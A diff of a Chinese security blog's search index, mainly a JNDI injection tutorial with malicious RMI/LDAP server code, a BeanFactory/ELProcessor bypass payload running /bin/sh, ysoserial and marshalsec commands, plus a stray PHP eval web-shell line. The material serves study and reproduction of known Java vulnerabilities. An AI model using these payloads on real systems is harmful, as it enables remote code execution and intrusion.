class="string">"Exploit"</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">'#'</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">"javaCodeBase"</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">"objectClass"</span>, <span class="string">"javaNamingReference"</span>);</span><br><span class="line">            e.addAttribute(<span class="string">"javaFactory"</span>, <span class="keyword">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>除了RMI服务外，JNDI也可以对接LDAP服务，LDAP也能返回JNDI Reference对象。整个过程与上个方法类似，并且不受<code>com.sun.jndi.rmi.object.trustCodebase</code>等限制，适用范围更广。</p>
-<h2 id="限制-2"><a href="#限制-2" class="headerlink" title="限制"></a>限制</h2><p>在Oracle JDK11.0.1、8u191、7u201、6u211之后，将com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被调整为false。</p>
-<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>前面的流程与RMI一样，最终进入了PartialCompositeContext#lookup。</p>
-<p><img src="11.png" alt=""></p>
-<p>然后进入了ComponentContext#p_lookup。</p>
-<p><img src="12.png" alt=""></p>
-<p>继续跟进LdapCtx#c_lookup。</p>
-<p><img src="13.png" alt=""></p>
-<p>在该函数中，最终进入DirectoryManager#getObjectInstance(),后面的过程与RMI的后面一样，最终实例化。</p>
-<h2 id="限制-3"><a href="#限制-3" class="headerlink" title="限制"></a>限制</h2><p>在JDK8u191之后，在使用codebase从远程loadClass时，会进行判断。</p>
-<p><img src="14.png" alt=""></p>
-<p>且com.sun.jndi.ldap.object.trustURLCodebase被设置为了false。</p>
-<p><img src="15.png" alt=""></p>
-<h1 id="绕过高版本JDK的限制"><a href="#绕过高版本JDK的限制" class="headerlink" title="绕过高版本JDK的限制"></a>绕过高版本JDK的限制</h1><p>根据以上介绍的限制，在Oracle JDK11.0.1、8u191、7u201、6u211及更高版本的JDK来说，前面提到的方式都失效了。对于存在以上漏洞但JDK版本很高的环境中，有人提到了如下2中方式进行bypass。<br>两种方式都很依赖受害者本地CLASSPATH中环境。  </p>
-<h2 id="利用本地CLASSPATH中的恶意Reference-Factory类"><a href="#利用本地CLASSPATH中的恶意Reference-Factory类" class="headerlink" title="利用本地CLASSPATH中的恶意Reference Factory类"></a>利用本地CLASSPATH中的恶意Reference Factory类</h2><p>前面分析的整个过程首先是远程加载factory，然后进行实例化。但是在高版本的限制中，无法进行远程加载的时候，利用本地存在的Reference恶意类。实际上，本地不可能存在一个实例化就执行恶意代码的类。因此，看看加载完factory并实例化之后的事情。定位到NamingManager#getObjectInstance。</p>
-<p><img src="16.png" alt=""></p>
-<p>在前面分析到NamingManager#getObjectFactoryFromReference时，首先会进行本地factory的加载。 </p>
-<p><img src="10.png" alt=""></p>
-<p>在通过getObjectFactoryFromReference中获取到Factory类之后，对调用其getObjectInstance函数，其中参数ref和name是可控的。</p>
-<p>因此，在高版本如JDK8u191以上的版本上，可以在返回的Reference中指定Factory类。这个类必须在受害者目标本地的CLASSPATH中。其中该类需要满足以下条件:</p>
-<ol>
-<li>实现<code>javax.naming.spi.ObjectFactory</code>接口</li>
-<li>至少存在一个getObjectInstance()方法</li>
-</ol>
-<h3 id="BeanFactory"><a href="#BeanFactory" class="headerlink" title="BeanFactory"></a>BeanFactory</h3><p>org.apache.naming.factory.BeanFactory满足以上两个条件。它存在于Tomcat依赖包中，使用非常广泛，来看看如何利用它。首先定位到BeanFactory#getObjectInstance()函数。</p>
-<p><img src="9.png" alt=""></p>
-<p>可以看到在该函数中，如果传入的obj时一个ResourceRef实例，根据Reference对象的类名加载相应的类，并通过反射的方式实例化Reference所指向的任意Bean Class。</p>
-<p><img src="17.png" alt=""></p>
-<p>并且调用满足条件的方法，其中大概率是调用setter方法为所有属性赋值。看看满足条件的方法。</p>
-<p><img src="19.png" alt=""></p>
-<p>首先Reference类获取”forceString”的值，若值中存在等号(61)，则等号右边作为属性值对应的方法，左边为该方法的参数。若不含有=号，则获取该属性值的setter方法。相当于”forceString”可以为特定的属性指定setter方法一样。然后将方法和参数放入forced中，以供后续调用。</p>
-<p>在这样的情况下，目标Bean Class必须: 1)有一个无参构造方法；2)存在能被调用的方法。</p>
-<h3 id="ELProcessor类"><a href="#ELProcessor类" class="headerlink" title="ELProcessor类"></a>ELProcessor类</h3><p>在一篇文章中提到了利用javax.el.ELProcessor类。</p>
-<p><img src="18.png" alt=""></p>
-<p>其中eval函数仅接受一个String参数，执行传入的EL表达式。因此，只需要传入恶意的EL表达式即可达到RCE。现在需要解决的问题是将eval()函数设置为Reference类某属性的setter方法。让其自动调用</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ResourceRef ref &#x3D; new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);</span><br><span class="line">ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x&#x3D;eval&quot;));</span><br></pre></td></tr></table></figure>
-
-<p>根据前面的分析，x为eval()方法的参数，传入恶意的表达式。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ref.add(new StringRefAddr(&quot;x&quot;, &quot;&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;new java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]([&#39;&#x2F;bin&#x2F;sh&#39;,&#39;-c&#39;,&#39;open &#x2F;Applications&#x2F;Calculator.app&#39;]).start()&quot;)&quot;));</span><br></pre></td></tr></table></figure>
-
-<h3 id="完整的payload"><a href="#完整的payload" class="headerlink" title="完整的payload"></a>完整的payload</h3><p>以RMI服务器为例：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">"javax.el.ELProcessor"</span>, <span class="keyword">null</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="keyword">true</span>, <span class="string">"org.apache.naming.factory.BeanFactory"</span>, <span class="keyword">null</span>);</span><br><span class="line">            ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"forceString"</span>, <span class="string">"x=eval"</span>));</span><br><span class="line">            ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"x"</span>, <span class="string">""</span><span class="string">".getClass().forName("</span>javax.script.ScriptEngineManager<span class="string">").newInstance().getEngineByName("</span>JavaScript<span class="string">").eval("</span><span class="keyword">new</span> java.lang.ProcessBuilder[<span class="string">'(java.lang.String[])'</span>]([<span class="string">'/bin/sh'</span>,<span class="string">'-c'</span>,<span class="string">'open /Applications/Calculator.app'</span>]).start()<span class="string">")"</span>));</span><br><span class="line">            ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(ref);</span><br><span class="line">            registry.bind(<span class="string">"calc"</span>, referenceWrapper);</span><br></pre></td></tr></table></figure>
-
-<p>运行之后，客户端运行代码即可弹出计算器。</p>
-<blockquote>
-<p>在运行过程，可能需要多运行几次才能成功。在本地测试时，时而失败，时而成功。可能与EL表达式有关。</p>
-</blockquote>
-<h2 id="利用LDAP返回恶意的序列化对象"><a href="#利用LDAP返回恶意的序列化对象" class="headerlink" title="利用LDAP返回恶意的序列化对象"></a>利用LDAP返回恶意的序列化对象</h2><p>JNDI与LDAP之间交互，其中Java对象在LDAP目录有多种存储形式:  </p>
-<ul>
-<li>Java序列化</li>
-<li>JNDI Reference</li>
-<li>Marshalled对象</li>
-<li>Remote Location(已弃用)</li>
-</ul>
-<p>LDAP可以为存储的Java对象指定多种属性:</p>
-<ul>
-<li>javaCodeBase</li>
-<li>objectClass</li>
-<li>javaFactory</li>
-<li>javaSerializedData</li>
-</ul>
-<p>第二种方法中利用的是LDAP服务器支持直接返回一个Java对象的序列化数据。若Java对象的javaSerializedData属性值不为空，则客户端的obj.decodeObject()会对此字段值的内容进行反序列化。定位到obj.decodeObject()。</p>
-<p><img src="20.png" alt="">  </p>
-<p><img src="21.png" alt=""></p>
-<p>当javaSerializedData属性存在时，首先会获取到一个classloader。然后进入obj.deserializeObject()方法。</p>
-<p><img src="22.png" alt=""></p>
-<p>在这里面最终会进入到readObject()方法。</p>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>假设目标系统中存在着有漏洞的CommonsCollections库，那么首先可以利用ysoserial生成一个利用链，这里选择了commonscollections:3.2.1以及CommonsCollections6。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections6 &#39;&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&#39;|base64</span><br></pre></td></tr></table></figure>
-
-<p><img src="23.png" alt=""></p>
-<p>最终的LDAP服务器与前面比较，在sendResult时，对发送的Entry添加javaSerializedData属性，属性值为序列化的payload。</p>
-<p><img src="24.png" alt=""></p>
-<p>在复现时，为了避免codebase的影响，将其他属性注释掉了。最终在客户端lookup时弹出了计算器。</p>
-<h1 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h1><p>在实际遇到这样的漏洞时，直接利用工具会比较方便。</p>
-<h2 id="marshalsec"><a href="#marshalsec" class="headerlink" title="marshalsec"></a>marshalsec</h2><p>marshalsec可以很方便地启动一个LDAP/RMI Server</p>
-<h3 id="rmi"><a href="#rmi" class="headerlink" title="rmi"></a>rmi</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec.jar marshalsec.jndi.RMIRefServer http:&#x2F;&#x2F;ip:port&#x2F;package&#x2F;#Class 1099</span><br></pre></td></tr></table></figure>
-
-<h3 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;ip:port&#x2F;package&#x2F;#Class 1389</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a href="https://y4er.com/post/attack-java-jndi-rmi-ldap-2/" target="_blank" rel="noopener">攻击Java中的JNDI、RMI、LDAP(二)</a></li>
-<li><a href="https://xz.aliyun.com/t/6633" target="_blank" rel="noopener">JNDI注入整体的调用栈分析</a></li>
-<li><a href="https://www.anquanke.com/post/id/199481#h3-7" target="_blank" rel="noopener">JNDI with RMI</a></li>
-<li><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">如何绕过高版本JDK的限制进行JNDI注入利用</a></li>
-</ul>
+<p>具体分析发表在了先知社区。</p>
+<p><a href="https://xz.aliyun.com/t/7098" target="_blank" rel="noopener">Ripstech Java Security 2019 Calendar复现系列(一)</a><br><a href="https://xz.aliyun.com/t/7162" target="_blank" rel="noopener">Ripstech Java Security 2019 Calendar复现系列(二)</a><br><a href="https://xz.aliyun.com/t/7206" target="_blank" rel="noopener">Ripstech Java Security 2019 Calendar复现系列(三)</a><br><a href="https://xz.aliyun.com/t/7247" target="_blank" rel="noopener">Ripstech Java Security 2019 Calendar复现系列(四)</a>  </p>
+<p>环境放在了<a href="https://github.com/ananaskr/Java_Calendar_2019" target="_blank" rel="noopener">github</a>上。</p>
 ]]></content>
       <categories>
         <category>JAVA安全</category>
       </categories>
-      <tags>
-        <tag>JNDI</tag>
-      </tags>
   </entry>
   <entry>
     <title>Padding Oracle的解密以及加密攻击</title>
@@ -1924,37 +1738,6 @@
       <tags>
         <tag>Shiro</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>SSTI模版注入大集合</title>
-    <url>/2020/07/22/ssti/</url>
-    <content><![CDATA[<p>模版注入属于注入类漏洞，之前大部分见到的都是python语言的，直到遇到了php语言的模版注入，就打算趁此机会尽可能地将目前已有的SSTI做个总结。</p>
-<a id="more"></a>
-<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>SSTI模版注入，主要是一些框架在使用渲染函数渲染页面时，对用户的输入过分信任或者未对用户的输入进行严格的过滤，造成了模版可控，从而执行了恶意代码。根据语言以及模版分类，主要有以下:</p>
-<ul>
-<li>python<ul>
-<li>jinja2</li>
-<li>mako</li>
-<li>tornado</li>
-<li>django</li>
-</ul>
-</li>
-<li>php<ul>
-<li>smarty</li>
-<li>twig</li>
-</ul>
-</li>
-<li>java<ul>
-<li>jade</li>
-<li>velocity</li>
-</ul>
-</li>
-</ul>
-<p>由于模版的出现有了模版注入漏洞，为什么要使用模版呢？</p>
-]]></content>
-      <categories>
-        <category>SSTI</category>
-      </categories>
   </entry>
   <entry>
     <title>shiro-721 Padding Oracle漏洞分析复现</title>
@@ -3292,6 +3075,175 @@ select &quot;&lt;?php eval($_GET[&apos;post&apos;]);?&gt;;&quot;</code></pre><h1
       </categories>
       <tags>
         <tag>CommonsBeanUtils</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JNDI注入分析复现总结</title>
+    <url>/2020/06/06/jndi-injection/</url>
+    <content><![CDATA[<p>前面的文章总结了RMI的安全性问题，而JNDI注入这类问题比RMI安全问题更常见。这篇文章分析了JNDI注入的整个流程，以及如何绕过高版本的2种方式。所有的代码放在了<a href="https://github.com/ananaskr/rmi/tree/master/src/main/java/jndi" target="_blank" rel="noopener">github</a>上。</p>
+<a id="more"></a>
+
+<h1 id="JNDI注入介绍"><a href="#JNDI注入介绍" class="headerlink" title="JNDI注入介绍"></a>JNDI注入介绍</h1><p>JNDI注入是BlackHat 2016的一个议题<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf" target="_blank" rel="noopener">“A Journey From JNDI LDAP Manipulation To RCE”</a>。</p>
+<p>JNDI注入包括以下几种方法:</p>
+<ul>
+<li>JNDI配合RMI远程对象(codebase)</li>
+<li>JNDI Reference配合RMI</li>
+<li>JNDI Reference配合LDAP</li>
+</ul>
+<p>此攻击的整个步骤包括以下几步:</p>
+<ol>
+<li>服务端实例化JNDI initialContext</li>
+<li>initialContext初始化期间调用lookup(rmi://attacker/Obj)请求攻击者的恶意RMIServer/LDAPServer</li>
+<li>恶意RMIServer/LDAPServer返回JNDI Reference</li>
+<li>服务端接收到JNDI Reference后从恶意RMIServer/LDAPServer获取工厂类</li>
+<li>恶意RMIServer返回的工厂类中带有static块的Java代码，造成RCE</li>
+</ol>
+<h1 id="JNDI配合RMI远程对象"><a href="#JNDI配合RMI远程对象" class="headerlink" title="JNDI配合RMI远程对象"></a>JNDI配合RMI远程对象</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>攻击者将一个恶意的RMI远程对象绑定在RMI Registry上，然后将编译后远程对象类放在WEB服务器上，这个codebase地址由远程服务器的<code>java.rmi.server.codebase</code>属性设置，供受害者RMI客户端远程加载，RMI在lookup时，会先尝试在本地CLASSPATH中获取对应的Stub类定义，并从本地加载，若本地没有，则会向远程codebase指定地址去获取恶意对象。</p>
+<h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><p>此方式需要满足两个条件:</p>
+<ol>
+<li>安装并配置了SecurityManager</li>
+<li>Java版本低于7u21、6u45，或者设置了<code>java.rmi.server.useCodebaseOnly=false</code>。  </li>
+</ol>
+<p>官方将<code>java.rmi.server.useCodebaseOnly</code>的默认值由flase改成了true，在这样的情况下，Java虚拟机将只信任预先配置好的codebase，不再支持从RMI请求中获取。</p>
+<blockquote>
+<p>JNDI Naming Reference。JDK 7u21开始，java.rmi.server.useCodebaseOnly 默认值就为true，防止RMI客户端VM从其他Codebase地址上动态加载类。然而JNDI注入中的Reference Payload并不受useCodebaseOnly影响，因为它没有用到 RMI Class loading，它最终是通过URLClassLoader加载的远程类。</p>
+</blockquote>
+<h1 id="JNDI-Reference配合RMI"><a href="#JNDI-Reference配合RMI" class="headerlink" title="JNDI Reference配合RMI"></a>JNDI Reference配合RMI</h1><p>代码:</p>
+<ul>
+<li><p>Client.java</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CLIENT</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String uri = <span class="string">""</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Server.java</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SERVER</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference aa = <span class="keyword">new</span> Reference(<span class="string">"ExecTest"</span>, <span class="string">"ExecTest"</span>, <span class="string">"http://127.0.0.1:8081/"</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(aa);</span><br><span class="line">        System.out.println(<span class="string">"Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/aa'"</span>);</span><br><span class="line">        registry.bind(<span class="string">"aa"</span>, refObjWrapper);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>ExecTest.java</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure>
+<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>攻击者在RMI服务绑定一个JNDI Naming Reference，受害者接收到此Reference类后在解析时，会根据指定的codebase远程地址加载Factory类，原理上并非使用RMI Class Loading机制，不受第一种方式的限制。</p>
+<h2 id="调用流程"><a href="#调用流程" class="headerlink" title="调用流程"></a>调用流程</h2><p>从客户端lookup开始进行分析。进入客户端的lookup函数。</p>
+</li>
+</ul>
+<p><img src="1.png" alt=""></p>
+<p>先跟进getURLOrDefaultInitCtx(name)，然后再跟进lookup(name)。</p>
+<p><img src="2.png" alt=""></p>
+<p>通过url获取到scheme，即rmi，在该函数里初始化了rmiURLContext。然后跟进lookup(name)。</p>
+<p><img src="3.png" alt=""></p>
+<p>在这里进入到了GenericURLContext#lookup。然后继续跟进lookup。</p>
+<p><img src="4.png" alt=""></p>
+<p>这里调用了RegistryImpl_Stub#lookup函数。此lookup函数的作用在前面介绍RMI安全的已经介绍过了。即发送字符串到注册中心(即服务端)。服务端会根据字符串查找对应的ReferenceWrapper对象，然后返回给客户端。继续跟进decodeObject()函数。</p>
+<p><img src="5.png" alt=""></p>
+<p>如果是Reference对象，就会进入getReference()，获得绑定的Reference类。然后进入NamingManager.getObjectInstance()函数。</p>
+<p><img src="6.png" alt=""></p>
+<p>然后跟进getObjectFactoryFromReference()函数。</p>
+<p><img src="7.png" alt=""></p>
+<p>在该函数中，通过factoryName:ExecTest和codebase:<a href="http://127.0.0.1:8081/加载了class，然后在末尾执行newInstance进行实例化，从而RCE。" target="_blank" rel="noopener">http://127.0.0.1:8081/加载了class，然后在末尾执行newInstance进行实例化，从而RCE。</a></p>
+<h2 id="限制-1"><a href="#限制-1" class="headerlink" title="限制"></a>限制</h2><p>在JDK6u132、JDK7u122以及JDK8u113版本后，系统属性com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase默认值变为false，即不允许从远程的Codebase加载Reference工厂类。</p>
+<p><img src="8.png" alt=""></p>
+<p>并且在decodeObject()函数中增加了对trustURLCodebase的判断。</p>
+<blockquote>
+<p>在JDK8u111中，即使将trustURLCodebase默认值变为false，由于在decodeObject中并没有对于trustURLCodebase的判断，依然能够成功。</p>
+</blockquote>
+<h1 id="JNDI-Reference配合LDAP"><a href="#JNDI-Reference配合LDAP" class="headerlink" title="JNDI Reference配合LDAP"></a>JNDI Reference配合LDAP</h1><ul>
+<li><p>Client.java</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CLIENT</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String uri = <span class="string">""</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>ldap_server.java</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LdapServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">"dc=example,dc=com"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String url = <span class="string">"http://127.0.0.1:8081/#ExecTest"</span>;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1389</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                    <span class="string">"listen"</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">"0.0.0.0"</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(url)));</span><br><span class="line">            InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">"Listening on 0.0.0.0:"</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span> <span class="params">( URL cb )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">'.'</span>, <span class="string">'/'</span>).concat(<span class="string">".class"</span>));</span><br><span class="line">            System.out.println(<span class="string">"Send LDAP reference result for "</span> + base + <span class="string">" redirecting to "</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"Exploit"</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">'#'</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">"javaCodeBase"</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">"objectClass"</span>, <span class="string">"javaNamingReference"</span>);</span><br><span class="line">            e.addAttribute(<span class="string">"javaFactory"</span>, <span class="keyword">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
